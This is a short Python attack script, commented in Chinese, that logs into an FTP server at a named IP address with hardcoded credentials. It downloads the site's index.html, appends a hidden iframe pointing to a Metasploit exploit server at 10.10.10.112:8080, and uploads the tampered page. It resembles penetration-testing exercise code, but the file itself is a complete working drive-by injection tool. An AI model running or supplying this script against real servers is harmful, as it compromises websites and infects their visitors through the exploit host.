# coding=UTF-8
'''
关键是构建http://10.10.10.112:8080/exploit这个服务
这个服务是用Metasploit 构建的.
'''
import ftplib
def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print('[+] Downloaded Page:'+ page)
    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)

host = '123.56.99.154'
userName = 'test'
passWord = 'go2live.cn'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
redirect = '<iframe src="http://10.10.10.112:8080/exploit"></iframe>'
injectPage(ftp, 'index.html', redirect)